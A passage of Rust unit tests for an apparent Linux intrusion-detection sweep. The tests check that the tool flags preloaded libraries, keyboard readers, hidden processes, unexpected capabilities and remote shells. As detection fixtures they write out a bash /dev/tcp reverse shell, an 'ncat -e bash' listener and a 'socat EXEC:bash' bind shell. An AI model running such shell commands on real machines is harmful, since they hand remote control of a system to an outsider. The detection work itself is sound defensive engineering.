        assert!(!status("1000\t0\t0\t0"));
        assert!(!status("1000\t1000\t1000\t1000"));
        assert!(!status(""));
        fs::remove_file(dir.path().join("status")).unwrap();
        assert!(!super::of_root(dir.path()));
    }

    #[test]
    fn a_deleted_program_in_its_own_namespace_borrows_a_name() {
        let (dir, index) = fixture();
        let root = dir.path();
        let namespace = |pid: &str, id: &str| {
            fs::create_dir_all(root.join("proc").join(pid).join("ns")).unwrap();
            symlink(
                format!("user:[{id}]"),
                root.join("proc").join(pid).join("ns/user"),
            )
            .unwrap();
        };
        namespace("self", "1");
        // An updated program still running, and one that only took the
        // name: both listen and read the keyboard.
        for (pid, id, socket) in [("20", "1", "444"), ("21", "2", "555")] {
            process(
                root,
                pid,
                "/usr/bin/updated (deleted)",
                &[
                    ("3", "/dev/input/event0"),
                    ("4", &format!("socket:[{socket}]")),
                ],
                "LD_PRELOAD=/home/u/.evil.so;",
            );
            namespace(pid, id);
        }
        write(
            root,
            "proc/net/tcp",
            "  sl  local_address rem_address   st\n   0: 00000000:1F90 00000000:0000 0A 0:0 0:0 0 1000 0 444 1\n   1: 00000000:1F91 00000000:0000 0A 0:0 0:0 0 1000 0 555 1\n",
        );
        let live = check(&Scope {
            root,
            home: Some("home/u"),
            index: &index,
            origin: Origin::System,
        });
        let about = |pid: &str| -> Vec<String> {
            live.items
                .iter()
                .flat_map(|item| item.notes.iter())
                .filter(|note| {
                    note.contains(&format!("process {pid} "))
                        || note.contains(&format!("(process {pid})"))
                })
                .cloned()
                .collect()
        };
        // The updated one is a packaged program all the same: that it
        // listens with no packaged service behind it, and what was
        // preloaded into it, is said; its keyboard is its own business.
        let updated = about("20").join("\n");
        assert!(updated.contains("listens on TCP port 8080"), "{updated}");
        assert!(
            updated.contains("preloaded into /usr/bin/updated"),
            "{updated}"
        );
        assert!(!updated.contains("keyboard"), "{updated}");
        assert!(!updated.contains("deleted"), "{updated}");
        let borrowed = about("21").join("\n");
        assert!(
            borrowed.contains("runs a deleted program under the name /usr/bin/updated"),
            "{borrowed}"
        );
        assert!(borrowed.contains("reads the keyboard device"), "{borrowed}");
        assert!(borrowed.contains("listens on TCP port 8081"), "{borrowed}");
        assert!(
            borrowed.contains("preloaded into /usr/bin/updated"),
            "{borrowed}"
        );
        // The packaged file of that name is what the item shows; the
        // listener and the keyboard are alerts on it, so it is not hidden.
        let named = live
            .items
            .iter()
            .find(|item| item.path == "usr/bin/updated")
            .unwrap();
        let alerts: Vec<RuleId> = named.alerts.iter().map(|(rule, _)| *rule).collect();
        assert!(alerts.contains(&RuleId::KeyboardReader), "{alerts:?}");
        assert!(!named.is_trusted());
        let listening = live
            .items
            .iter()
            .find(|item| item.path == "usr/bin/updated:tcp-8081")
            .unwrap();
        assert_eq!(listening.alerts[0].0, RuleId::NetworkListener);
        assert!(!listening.is_trusted());
    }

    #[test]
    fn a_setuid_file_under_a_name_that_is_not_utf8_is_said() {
        use std::ffi::OsStr;
        use std::os::unix::ffi::OsStrExt;
        let dir = TempDir::new("sweep-live-unnamed");
        let root = dir.path();
        fs::create_dir_all(root.join("usr/local")).unwrap();
        let shell = root.join("usr/local").join(OsStr::from_bytes(b"sh\xff"));
        fs::write(&shell, "shell").unwrap();
        fs::set_permissions(&shell, fs::Permissions::from_mode(0o4755)).unwrap();
        fs::write(
            root.join("usr/local").join(OsStr::from_bytes(b"plain\xff")),
            "x",
        )
        .unwrap();
        fs::create_dir(root.join("usr").join(OsStr::from_bytes(b"dir\xff"))).unwrap();
        let index = PackageIndex::with_foreign(HashSet::new());
        let mut live = check(&Scope {
            root,
            home: None,
            index: &index,
            origin: Origin::System,
        });
        live.unchecked.sort();
        assert_eq!(
            live.unchecked,
            [
                "/usr/dir\u{fffd}: a name that is not UTF-8 was not checked",
                "/usr/local/sh\u{fffd}: a name that is not UTF-8 was not checked",
            ]
        );
    }

    #[test]
    fn only_what_does_not_add_up_is_listed() {
        let (dir, index) = fixture();
        let root = dir.path();
        let live = check(&Scope {
            root,
            home: Some("home/u"),
            index: &index,
            origin: Origin::System,
        });
        let seen: Vec<(&str, Category, Vec<RuleId>)> = live
            .items
            .iter()
            .map(|item| {
                (
                    item.path.as_str(),
                    item.category,
                    item.alerts.iter().map(|(rule, _)| *rule).collect(),
                )
            })
            .collect();
        assert_eq!(
            seen,
            [
                (
                    "home/u/.cache/dropper",
                    Category::Process,
                    vec![RuleId::RunningFromTemp]
                ),
                (
                    "home/u/.evil.so",
                    Category::Process,
                    vec![RuleId::PreloadedLibrary]
                ),
                (
                    "home/u/.local/bin/keylog",
                    Category::Input,
                    vec![RuleId::KeyboardReader]
                ),
                (
                    "home/u/.local/bin/tool",
                    Category::Process,
                    vec![RuleId::HiddenProgram]
                ),
                ("home/u/server:tcp-8080", Category::Listener, vec![]),
                (
                    "home/u/shell",
                    Category::Setuid,
                    vec![RuleId::UnknownPrivilegedFile]
                ),
                (
                    "memfd:payload",
                    Category::Process,
                    vec![RuleId::HiddenProgram]
                ),
                (
                    "sys/module/ghost",
                    Category::KernelModule,
                    vec![RuleId::UnknownKernelModule]
                ),
                (
                    "tmp/gone",
                    Category::Process,
                    vec![RuleId::HiddenProgram, RuleId::RunningFromTemp]
                ),
                (
                    "usr/bin/helper",
                    Category::Setuid,
                    vec![RuleId::UnknownPrivilegedFile]
                ),
                (
                    "usr/bin/python3:tcp-4444",
                    Category::Listener,
                    vec![RuleId::NetworkListener]
                ),
                (
                    "usr/lib/modules/6.1-test/extra/rootkit.ko",
                    Category::KernelModule,
                    vec![RuleId::UnknownKernelModule]
                ),
            ]
        );
        let server = live
            .items
            .iter()
            .find(|item| item.path == "home/u/server:tcp-8080")
            .unwrap();
        assert!(server.notes[0].contains("TCP port 8080"));
        // The file at the path of a deleted program is not what runs.
        let tool = live
            .items
            .iter()
            .find(|item| item.path == "home/u/.local/bin/tool")
            .unwrap();
        assert!(tool.sha256.is_none());
        assert!(tool.notes[0].contains("the file there now is another one"));
        assert!(live.notes.iter().any(|note| note.contains("out-of-tree")));
    }

    #[test]
    fn modules_wait_for_a_reboot_after_a_kernel_update() {
        let (dir, index) = fixture();
        let root = dir.path();
        // The updated kernel's package no longer has this release.
        fs::remove_file(root.join("usr/lib/modules/6.1-test/pkgbase")).unwrap();
        let live = check(&Scope {
            root,
            home: Some("home/u"),
            index: &index,
            origin: Origin::System,
        });
        assert!(
            !live
                .items
                .iter()
                .any(|item| item.category == Category::KernelModule)
        );
        assert!(
            live.notes
                .iter()
                .any(|note| note.contains("after a reboot"))
        );
    }

    #[test]
    fn a_socket_is_looked_at_for_every_process_that_shares_it() {
        let (dir, index) = fixture();
        let root = dir.path();
        // The program that opened it, and a packaged one it handed it to.
        process(
            root,
            "30",
            "/home/u/server",
            &[("3", "socket:[777]"), ("4", "socket:[777]")],
            "",
        );
        process(
            root,
            "31",
            "/usr/bin/hyprland",
            &[("3", "socket:[777]")],
            "",
        );
        write(
            root,
            "proc/net/tcp",
            "  sl  local_address rem_address   st\n   0: 00000000:2328 00000000:0000 0A 0:0 0:0 0 1000 0 777 1\n",
        );
        let live = check(&Scope {
            root,
            home: Some("home/u"),
            index: &index,
            origin: Origin::System,
        });
        let notes: Vec<&String> = live.items.iter().flat_map(|item| &item.notes).collect();
        assert!(
            notes
                .iter()
                .any(|note| note.contains("process 30 ")
                    && note.contains("listens on TCP port 9000")),
            "{notes:?}"
        );
        // The packaged program has no packaged service behind it: it is
        // shown too, as itself.
        let handed = live
            .items
            .iter()
            .find(|item| item.path == "usr/bin/hyprland:tcp-9000")
            .unwrap();
        assert!(handed.notes[0].contains("process 31 "), "{handed:?}");
        assert_eq!(handed.alerts[0].0, RuleId::NetworkListener);
        // A second copy of the socket in one process says nothing twice.
        assert_eq!(
            notes
                .iter()
                .filter(|note| note.contains("process 30 "))
                .count(),
            1,
            "{notes:?}"
        );
    }

    /// A process as the checks read it.
    fn running(
        exe: &str,
        arguments: &[&str],
        cwd: Option<&str>,
        environment: &str,
    ) -> super::Process {
        super::Process {
            pid: "7".into(),
            exe: exe.into(),
            exe_id: None,
            arguments: arguments
                .iter()
                .map(|argument| (*argument).to_string())
                .collect(),
            environment: Some(environment.replace(';', "\0").into_bytes()),
            cwd: cwd.map(str::to_string),
            ..super::Process::default()
        }
    }

    /// What the temporary and preload checks say about `process`: each
    /// item's path, alerts and notes.
    fn said(
        scope: &Scope<'_>,
        process: &super::Process,
        exe: &str,
    ) -> Vec<(String, Vec<RuleId>, Vec<String>)> {
        let mut found = super::Found::default();
        super::temporary_checks(scope, process, exe, &mut found);
        super::preload_checks(scope, process, exe, &mut found);
        found
            .items
            .into_values()
            .map(|item| {
                (
                    item.path,
                    item.alerts.iter().map(|(rule, _)| *rule).collect(),
                    item.notes,
                )
            })
            .collect()
    }

    #[test]
    fn the_script_is_looked_for_past_an_options_value() {
        // After an option that takes a value in one interpreter and none
        // in another, both readings are looked at; code on the command
        // line names no file.
        let candidates = |arguments: &[&str]| {
            let owned: Vec<String> = arguments
                .iter()
                .map(|argument| (*argument).to_string())
                .collect();
            super::script_arguments(&owned)
                .into_iter()
                .map(str::to_string)
                .collect::<Vec<_>>()
        };
        assert_eq!(
            candidates(&["python3", "-W", "ignore", "/tmp/evil.py", "argument"]),
            ["ignore", "/tmp/evil.py"]
        );
        assert_eq!(
            candidates(&["python3", "-I", "/tmp/evil.py"]),
            ["/tmp/evil.py"]
        );
        assert_eq!(
            candidates(&[
                "ld-linux-x86-64.so.2",
                "--library-path",
                "/tmp",
                "/tmp/evil"
            ]),
            ["/tmp", "/tmp/evil"]
        );
        assert_eq!(candidates(&["bash", "-x", "a.sh", "b.sh"]), ["a.sh"]);
        // `-e`, `-c` and `-m` are plain flags in a shell, and take code or
        // a module elsewhere: what follows is looked at as a file either
        // way, and code names none.
        assert_eq!(candidates(&["bash", "-e", "/tmp/x.sh"]), ["/tmp/x.sh"]);
        assert_eq!(candidates(&["sh", "-c", "/tmp/x"]), ["/tmp/x"]);
        assert_eq!(candidates(&["python3", "-c", "import os"]), ["import os"]);
        assert_eq!(
            candidates(&["python3", "-m", "http.server"]),
            ["http.server"]
        );
    }

    #[test]
    fn what_an_interpreter_or_the_loader_runs_is_what_is_judged() {
        let dir = TempDir::new("live-scripts");
        let root = dir.path();
        for path in ["tmp/evil.py", "tmp/evil", "home/u/work/tool.py"] {
            write(root, path, "x");
        }
        let index = PackageIndex::with_foreign(HashSet::new());
        let scope = Scope {
            root,
            home: Some("home/u"),
            index: &index,
            origin: Origin::System,
        };
        // A script by a relative name is found where the process runs.
        let relative = running("/usr/bin/python3", &["python3", "evil.py"], Some("tmp"), "");
        assert_eq!(
            super::subject(&scope, &relative, "usr/bin/python3").0,
            "tmp/evil.py"
        );
        let elsewhere = running(
            "/usr/bin/python3",
            &["python3", "evil.py"],
            Some("home/u"),
            "",
        );
        assert_eq!(
            super::subject(&scope, &elsewhere, "usr/bin/python3").0,
            "usr/bin/python3"
        );
        // The loader runs the program it is given.
        let loader = "usr/lib/ld-linux-x86-64.so.2";
        assert!(super::is_interpreter(loader));
        assert!(super::is_interpreter("usr/bin/gawk"));
        assert!(!super::is_interpreter("usr/bin/ldd"));
        let loaded = running(&format!("/{loader}"), &[loader, "/tmp/evil"], None, "");
        assert_eq!(super::subject(&scope, &loaded, loader).0, "tmp/evil");

        // Either one, run from a temporary directory, is said; a script
        // elsewhere is not.
        for (process, exe, script) in [
            (&relative, "usr/bin/python3", "tmp/evil.py"),
            (&loaded, loader, "tmp/evil"),
        ] {
            let found = said(&scope, process, exe);
            assert!(
                matches!(found.as_slice(), [(path, alerts, _)]
                    if path == script && alerts == &[RuleId::RunningFromTemp]),
                "{found:?}"
            );
        }
        // Whichever reading names a file in a temporary directory, it is
        // said: a harmless file given as the "value" hides nothing.
        write(root, "tmp/ignore", "x");
        for arguments in [
            &["python3", "-W", "ignore", "/tmp/evil.py"][..],
            &["python3", "-I", "/tmp/evil.py", "/home/u/work/tool.py"][..],
        ] {
            let process = running("/usr/bin/python3", arguments, Some("tmp"), "");
            let found = said(&scope, &process, "usr/bin/python3");
            assert!(
                found.iter().any(|(path, alerts, _)| path == "tmp/evil.py"
                    && alerts == &[RuleId::RunningFromTemp]),
                "{arguments:?} {found:?}"
            );
        }
        // An AppImage's own start script is noted, not flagged.
        write(root, "tmp/.mount_app/AppRun", "x");
        let appimage = running(
            "/usr/bin/bash",
            &["bash", "/tmp/.mount_app/AppRun"],
            None,
            "",
        );
        let found = said(&scope, &appimage, "usr/bin/bash");
        assert!(
            matches!(found.as_slice(), [(path, alerts, _)]
                if path == "tmp/.mount_app/AppRun" && alerts.is_empty()),
            "{found:?}"
        );
        let fine = running(
            "/usr/bin/python3",
            &["python3", "work/tool.py"],
            Some("home/u"),
            "LD_LIBRARY_PATH=/opt/app/lib:/tmp/.mount_app/usr/lib",
        );
        assert!(said(&scope, &fine, "usr/bin/python3").is_empty());
    }

    #[test]
    fn libraries_from_a_temporary_directory_and_audit_libraries_are_said() {
        let dir = TempDir::new("live-libraries");
        let root = dir.path();
        write(root, "home/u/.audit.so", "x");
        let index = PackageIndex::with_foreign(HashSet::new());
        let scope = Scope {
            root,
            home: Some("home/u"),
            index: &index,
            origin: Origin::System,
        };
        let searching = running(
            "/usr/bin/python3",
            &["python3"],
            None,
            "LD_LIBRARY_PATH=/usr/lib:/tmp/libs:lib:;LD_AUDIT=/home/u/.audit.so",
        );
        let found = said(&scope, &searching, "usr/bin/python3");
        let about = |path: &str| found.iter().find(|(found, _, _)| found == path).unwrap();
        let (_, alerts, notes) = about("usr/bin/python3");
        assert_eq!(alerts, &[RuleId::PreloadedLibrary]);
        assert!(
            notes.iter().any(|note| note.contains("in /tmp/libs first")),
            "{notes:?}"
        );
        assert!(
            notes
                .iter()
                .any(|note| note.contains("relative to where it runs first")),
            "{notes:?}"
        );
        assert!(!notes.iter().any(|note| note.contains("in /usr/lib first")));
        // An audit library is loaded into the program like a preload.
        let (_, alerts, _) = about("home/u/.audit.so");
        assert_eq!(alerts, &[RuleId::PreloadedLibrary]);
        assert_eq!(
            super::searched(Some(b"LD_LIBRARY_PATH=/a//b/:rel\0")),
            [Some("a/b".to_string()), None]
        );
        // What every launcher leaves behind says nothing.
        assert!(super::searched(Some(b"LD_LIBRARY_PATH=:$ORIGIN/lib::${LIB}:/\0")).is_empty());
        // A token followed by `..`, or an unknown one, is not one of those.
        assert_eq!(
            super::searched(Some(b"LD_LIBRARY_PATH=$ORIGIN/../../tmp/x:$HOME/lib\0")),
            [None, None]
        );
        let launcher = running(
            "/usr/bin/python3",
            &["python3"],
            None,
            "LD_LIBRARY_PATH=/opt/app/lib:",
        );
        assert!(said(&scope, &launcher, "usr/bin/python3").is_empty());
    }

    #[test]
    fn a_relay_is_named_by_itself_not_by_what_it_runs() {
        let dir = TempDir::new("live-relay");
        let root = dir.path();
        write(root, "usr/bin/bash", "bash");
        write(root, "home/u/server.py", "serve");
        let index = PackageIndex::with_foreign(HashSet::new());
        let scope = Scope {
            root,
            home: Some("home/u"),
            index: &index,
            origin: Origin::System,
        };
        let process = |exe: &str, arguments: &[&str]| super::Process {
            pid: "1".into(),
            exe: exe.into(),
            exe_id: None,
            arguments: arguments
                .iter()
                .map(|argument| (*argument).to_string())
                .collect(),
            ..super::Process::default()
        };
        let ncat = process(
            "/usr/bin/ncat",
            &["ncat", "-e", "/usr/bin/bash", "-lk", "4444"],
        );
        assert_eq!(
            super::subject(&scope, &ncat, "usr/bin/ncat").0,
            "usr/bin/ncat"
        );
        let python = process("/usr/bin/python3", &["python3", "/home/u/server.py"]);
        assert_eq!(
            super::subject(&scope, &python, "usr/bin/python3").0,
            "home/u/server.py"
        );
    }

    /// An index in which package `package` installed `files` (path and
    /// content).
    fn installed_by(index: &mut PackageIndex, package: &str, files: &[(&str, &str)]) {
        let mut mtree = String::from("#mtree\n/set type=file mode=755\n");
        for (path, text) in files {
            writeln!(
                mtree,
                "./{path} sha256digest={}",
                Sha256::digest(text.as_bytes())
            )
            .unwrap();
        }
        index.add_for_test(package, &mtree, &[]);
    }

    /// A system whose package `core` installed `files`, each as it was
    /// installed.
    fn system(label: &str, files: &[(&str, &str)]) -> (TempDir, PackageIndex) {
        let dir = TempDir::new(label);
        for (path, text) in files {
            write(dir.path(), path, text);
        }
        let mut index = PackageIndex::with_foreign(HashSet::new());
        installed_by(&mut index, "core", files);
        (dir, index)
    }

    fn look(root: &Path, index: &PackageIndex, origin: Origin) -> super::Live {
        check(&Scope {
            root,
            home: Some("home/u"),
            index,
            origin,
        })
    }

    /// One file of a process's `/proc` directory.
    fn detail(root: &Path, pid: &str, name: &str, text: &str) {
        write(root, &format!("proc/{pid}/{name}"), text);
    }

    /// The paths and alerts of what was found, but the trusted items.
    fn listed(live: &super::Live) -> Vec<(&str, Vec<RuleId>)> {
        live.items
            .iter()
            .filter(|item| !item.is_trusted())
            .map(|item| {
                (
                    item.path.as_str(),
                    item.alerts.iter().map(|(rule, _)| *rule).collect(),
                )
            })
            .collect()
    }

    /// A `/proc/net` table of `sockets`: local and remote end, state and
    /// inode.
    fn table(root: &Path, name: &str, sockets: &[(&str, &str, &str, &str)]) {
        let mut text = String::from("  sl  local_address rem_address   st\n");
        for (index, (local, remote, state, inode)) in sockets.iter().enumerate() {
            writeln!(
                text,
                "{index:4}: {local} {remote} {state} 0:0 0:0 0 1000 0 {inode} 1"
            )
            .unwrap();
        }
        write(root, &format!("proc/net/{name}"), &text);
    }

    #[test]
    fn capabilities_a_package_does_not_set_are_said_by_how_far_they_go() {
        use super::{capability_names, unexpected_capabilities as rule};
        let names = |clauses: &str| capability_names(clauses);
        // Every capability, however it is written.
        assert_eq!(names("=ep"), None);
        assert_eq!(names("all=eip"), None);
        assert_eq!(names("=ep [rootid=1000]"), None);
        assert_eq!(
            names("cap_net_raw,cap_setgid=ep cap_chown=i"),
            Some(vec![
                "cap_chown".to_string(),
                "cap_net_raw".to_string(),
                "cap_setgid".to_string()
            ])
        );
        // A clause that takes away, or gives no set, gives nothing.
        assert_eq!(
            names("cap_net_raw+ep cap_kill-ep cap_chown="),
            Some(vec!["cap_net_raw".to_string()])
        );
        assert_eq!(
            parse_getcap(
                "/usr/bin/python3 =ep\n/usr/bin/x 41=ep\n/usr/bin/a b cap_kill+ep cap_chown+i\nno clause here\n"
            ),
            [
                ("usr/bin/python3".to_string(), "=ep".to_string()),
                ("usr/bin/x".to_string(), "41=ep".to_string()),
                (
                    "usr/bin/a b".to_string(),
                    "cap_kill+ep cap_chown+i".to_string()
                ),
            ]
        );

        let high = Some(RuleId::UnknownPrivilegedFile);
        let medium = Some(RuleId::UnexpectedCapability);
        assert_eq!(rule("usr/bin/python3", "=ep"), high);
        for capability in [
            "cap_dac_read_search",
            "cap_sys_rawio",
            "cap_setfcap",
            "cap_mknod",
            "cap_bpf",
            "cap_net_admin",
            "cap_sys_chroot",
            "cap_sys_boot",
            "cap_mac_admin",
            "cap_mac_override",
            "cap_linux_immutable",
            "cap_setpcap",
            "cap_setuid",
            // One getcap has no name for.
            "41",
        ] {
            assert_eq!(rule("usr/bin/tar", &format!("{capability}+ep")), high);
        }
        for capability in [
            "cap_net_raw",
            "cap_perfmon",
            "cap_sys_time",
            "cap_audit_control",
            "cap_sys_resource",
            "cap_kill",
            "cap_ipc_owner",
            "cap_net_bind_service",
        ] {
            assert_eq!(rule("usr/bin/tar", &format!("{capability}=ep")), medium);
        }
        // One root-like capability among others decides.
        assert_eq!(rule("usr/bin/tar", "cap_kill,cap_bpf=ep"), high);
        // What a package sets on its own program, and nothing more.
        assert_eq!(rule("usr/bin/newuidmap", "cap_setuid=ep"), None);
        assert_eq!(rule("usr/bin/newuidmap", "cap_setgid,cap_setuid=ep"), high);
        assert_eq!(rule("usr/bin/newgidmap", "cap_setuid=ep"), high);
        assert_eq!(
            rule(
                "usr/lib/gstreamer-1.0/gst-ptp-helper",
                "cap_net_bind_service,cap_net_admin=ep"
            ),
            None
        );
        assert_eq!(rule("usr/bin/rsh", "cap_net_bind_service=ep"), None);
        assert_eq!(
            rule("usr/bin/rsh", "cap_net_bind_service,cap_kill=ep"),
            medium
        );
        for (path, expected) in super::EXPECTED_CAPABILITIES {
            assert!(expected.is_sorted(), "{path}");
            assert!(
                expected
                    .iter()
                    .all(|name| super::ROOT_CAPABILITIES.contains(name)
                        || super::OTHER_CAPABILITIES.contains(name)),
                "{path}"
            );
        }
    }

    #[test]
    fn a_packaged_file_with_capabilities_of_its_own_is_listed() {
        let (dir, index) = system(
            "live-capabilities",
            &[("usr/bin/python3", "python"), ("usr/bin/ping", "ping")],
        );
        let scope = Scope {
            root: dir.path(),
            home: None,
            index: &index,
            origin: Origin::System,
        };
        let mut found = super::Found::default();
        for (path, capabilities) in [
            ("usr/bin/python3", "=ep"),
            ("usr/bin/ping", "cap_net_raw=ep"),
        ] {
            let looked = crate::sweep::collect::look(&scope, Category::Setuid, path, None);
            super::privileged(
                &scope,
                &mut found,
                path,
                &looked,
                &format!("capabilities {capabilities}"),
                Some(capabilities),
            );
        }
        let items: Vec<&crate::sweep::collect::Item> = found.items.values().collect();
        assert_eq!(items.len(), 1, "{items:?}");
        assert_eq!(items[0].path, "usr/bin/python3");
        assert_eq!(items[0].alerts[0].0, RuleId::UnknownPrivilegedFile);
        assert!(items[0].notes[0].contains("capabilities =ep"));
        assert!(!items[0].is_trusted());
    }

    #[test]
    fn a_shell_or_interpreter_on_a_connection_is_a_remote_shell() {
        let unit = "usr/lib/systemd/system/handler@.service";
        let (dir, index) = system(
            "live-remote-shell",
            &[
                ("usr/bin/bash", "bash"),
                ("usr/bin/python3", "python"),
                ("usr/bin/sleep", "sleep"),
                (
                    unit,
                    "[Service]\nExecStart=-/usr/bin/python3 -u /usr/lib/handler\nStandardInput=socket\n",
                ),
            ],
        );
        let root = dir.path();
        let stdio = |inode: &str| -> Vec<(String, String)> {
            ["0", "1", "2"]
                .iter()
                .map(|fd| ((*fd).to_string(), format!("socket:[{inode}]")))
                .collect()
        };
        let on = |pid: &str, exe: &str, fds: &[(String, String)]| {
            let fds: Vec<(&str, &str)> = fds
                .iter()
                .map(|(fd, target)| (fd.as_str(), target.as_str()))
                .collect();
            process(root, pid, exe, &fds, "");
        };
        // `bash -i >& /dev/tcp/203.0.113.5/443 0>&1`.
        on("10", "/usr/bin/bash", &stdio("500"));
        // What every service has: output on a local socket (the journal).
        on("11", "/usr/bin/python3", &stdio("600"));
        on("12", "/usr/bin/bash", &stdio("600"));
        // A shell at a terminal that opened `/dev/tcp` on descriptor 3.
        process(
            root,
            "13",
            "/usr/bin/bash",
            &[("0", "/dev/pts/1"), ("3", "socket:[501]")],
            "",
        );
        // An interpreter something on this machine drives.
        on("14", "/usr/bin/python3", &stdio("502"));
        // A packaged service started per connection: its program is not
        // said, a shell started that way is.
        let group = "0::/system.slice/system-handler.slice/handler@7.service\n";
        on("15", "/usr/bin/python3", &stdio("503"));
        detail(root, "15", "cgroup", group);
        on("16", "/usr/bin/bash", &stdio("504"));
        detail(root, "16", "cgroup", group);
        // A program that runs nothing it is told, and an interpreter with
        // a connection that is not its input: a client.
        on("17", "/usr/bin/sleep", &stdio("505"));
        process(
            root,
            "18",
            "/usr/bin/python3",
            &[("0", "/dev/pts/2"), ("7", "socket:[506]")],
            "",
        );
        let here = "0200A8C0:D431";
        table(
            root,
            "tcp",
            &[
                (here, "057100CB:01BB", "01", "500"),
                (here, "076433C6:115C", "01", "501"),
                ("0100007F:D432", "0100007F:1F90", "01", "502"),
                (here, "097100CB:C001", "01", "503"),
                (here, "097100CB:C002", "01", "504"),
                (here, "057100CB:0050", "01", "505"),
                (here, "057100CB:0050", "01", "506"),
            ],
        );
        let live = look(root, &index, Origin::System);
        assert_eq!(
            listed(&live),
            [
                ("usr/bin/bash:to-198.51.100.7", vec![RuleId::RemoteShell]),
                ("usr/bin/bash:to-203.0.113.5", vec![RuleId::RemoteShell]),
                ("usr/bin/bash:to-203.0.113.9", vec![RuleId::RemoteShell]),
                ("usr/bin/python3:to-127.0.0.1", vec![RuleId::NetworkRelay]),
            ]
        );
        let shell = live
            .items
            .iter()
            .find(|item| item.path == "usr/bin/bash:to-203.0.113.5")
            .unwrap();
        assert!(
            shell.notes[0]
                .contains("has its input or output on a connection to 203.0.113.5 port 443"),
            "{:?}",
            shell.notes
        );
        // The item is the shell's file, under the name of what it does.
        assert_eq!(shell.sha256, Some(Sha256::digest(b"bash")));
    }

    #[test]
    fn addresses_are_shown_as_they_are_written() {
        use super::net::shown;
        assert_eq!(shown("0100007F"), "127.0.0.1");
        assert_eq!(shown("057100CB"), "203.0.113.5");
        assert_eq!(shown("00000000000000000000000001000000"), "::1");
        assert_eq!(shown("0000000000000000FFFF0000057100CB"), "203.0.113.5");
        assert_eq!(shown("B80D0120000000000000000001000000"), "2001:db8::1");
        assert!(is_loopback("0000000000000000FFFF00000100007F"));
    }

    /// The listeners of `listeners_are_named_by_what_they_are`.
    fn listening_processes(root: &Path) {
        let session = "0::/user.slice/user-1000.slice/session-1.scope\n";
        let start = |pid: &str, exe: &str, inode: &str, group: &str, arguments: &str| {
            let socket = format!("socket:[{inode}]");
            process(root, pid, exe, &[("0", "/dev/null"), ("3", &socket)], "");
            detail(root, pid, "cgroup", group);
            detail(root, pid, "cmdline", &arguments.replace(' ', "\0"));
        };
        start(
            "20",
            "/usr/bin/sshd",
            "700",
            "0::/system.slice/sshd.service\n",
            "sshd: /usr/bin/sshd -D [listener]",
        );
        start(
            "21",
            "/usr/bin/sshd",
            "701",
            session,
            "/usr/bin/sshd -f /tmp/cfg -p 2222",
        );
        start(
            "22",
            "/usr/bin/socat",
            "702",
            session,
            "socat TCP-LISTEN:4444,fork EXEC:bash",
        );
        start("23", "/usr/bin/nginx", "703", session, "nginx");
        let own = "0::/user.slice/user-1000.slice/user@1000.service/app.slice/mpd.service\n";
        start("24", "/usr/bin/mpd", "704", own, "/usr/bin/mpd --systemd");
        // Moved into that group by its user: the unit does not start it.
        start("25", "/usr/bin/nginx", "705", own, "nginx");
        start(
            "26",
            "/usr/bin/python3",
            "706",
            session,
            "python3 -m http.server 8000",
        );
        start(
            "27",
            "/usr/bin/python3",
            "707",
            session,
            "python3 -m http.server 0",
        );
        start(
            "28",
            "/usr/bin/python3",
            "708",
            session,
            "python3 -m other 8000",
        );
        start("29", "/home/u/tool", "709", session, "tool");
        for (fd, inode) in [("4", "710"), ("5", "711")] {
            symlink(
                format!("socket:[{inode}]"),
                root.join("proc/29/fd").join(fd),
            )
            .unwrap();
        }
    }

    /// A system with listeners of every kind (see `listening_processes`).
    fn listening_system() -> (TempDir, PackageIndex) {
        let (dir, index) = system(
            "live-listeners",
            &[
                ("usr/bin/sshd", "sshd"),
                ("usr/bin/socat", "socat"),
                ("usr/bin/nginx", "nginx"),
                ("usr/bin/mpd", "mpd"),
                ("usr/bin/python3", "python"),
                (
                    "usr/lib/systemd/system/sshd.service",
                    "[Service]\nExecStart=/usr/bin/sshd -D\n",
                ),
                (
                    "usr/lib/systemd/user/mpd.service",
                    "[Service]\nExecStart=/usr/bin/mpd --systemd\n",
                ),
            ],
        );
        let root = dir.path();
        write(root, "home/u/tool", "tool");
        listening_processes(root);
        let any = "00000000";
        let none = "00000000:0000";
        table(
            root,
            "tcp",
            &[
                (&format!("{any}:0016"), none, "0A", "700"),
                (&format!("{any}:08AE"), none, "0A", "701"),
                (&format!("{any}:115C"), none, "0A", "702"),
                (&format!("{any}:1F90"), none, "0A", "703"),
                (&format!("{any}:19C8"), none, "0A", "704"),
                (&format!("{any}:1F91"), none, "0A", "705"),
                (&format!("{any}:1F40"), none, "0A", "706"),
                // A port the kernel picked.
                (&format!("{any}:9C40"), none, "0A", "707"),
                (&format!("{any}:1F41"), none, "0A", "708"),
                // Root's, or another user's: nobody here holds it.
                (&format!("{any}:7A69"), none, "0A", "999"),
            ],
        );
        table(
            root,
            "udp",
            &[
                (&format!("{any}:270F"), none, "07", "709"),
                // mDNS, and a socket that only sent something.
                (&format!("{any}:14E9"), none, "07", "710"),
                (&format!("{any}:9C41"), none, "07", "711"),
                // A packaged server answering on UDP.
                (&format!("{any}:0035"), none, "07", "703"),
            ],
        );
        (dir, index)
    }

    #[test]
    fn listeners_are_named_by_what_they_are() {
        let (dir, index) = listening_system();
        let live = look(dir.path(), &index, Origin::System);
        assert_eq!(
            listed(&live),
            [
                ("home/u/tool:udp-9999", vec![]),
                ("usr/bin/nginx:tcp-8080", vec![RuleId::NetworkListener]),
                ("usr/bin/nginx:tcp-8081", vec![RuleId::NetworkListener]),
                (
                    "usr/bin/python3:listens:http.server",
                    vec![RuleId::NetworkListener]
                ),
                (
                    "usr/bin/python3:tcp-8000:http.server",
                    vec![RuleId::NetworkListener]
                ),
                (
                    "usr/bin/python3:tcp-8001:other",
                    vec![RuleId::NetworkListener]
                ),
                ("usr/bin/socat:tcp-4444", vec![RuleId::NetworkRelay]),
                ("usr/bin/sshd:tcp-2222", vec![RuleId::NetworkRelay]),
            ]
        );
        // What a packaged service runs is listed with the trusted items.
        for (path, port) in [("usr/bin/sshd", "22"), ("usr/bin/mpd", "6600")] {
            let item = live.items.iter().find(|item| item.path == path).unwrap();
            assert!(item.is_trusted() && item.category == Category::Listener);
            assert!(
                item.notes[0].ends_with(&format!("listens on TCP port {port} from the network")),
                "{:?}",
                item.notes
            );
        }
        assert!(
            live.notes
                .iter()
                .any(|note| note
                    .starts_with("1 listening socket(s) belong to processes of other users")),
            "{:?}",
            live.notes
        );
    }

    #[test]
    fn only_the_service_a_process_is_in_vouches_for_it() {
        use super::net::{Starter, started_by_packaged_unit, starter};
        let user = "/user.slice/user-1000.slice/user@1000.service";
        for (cgroup, expected) in [
            (
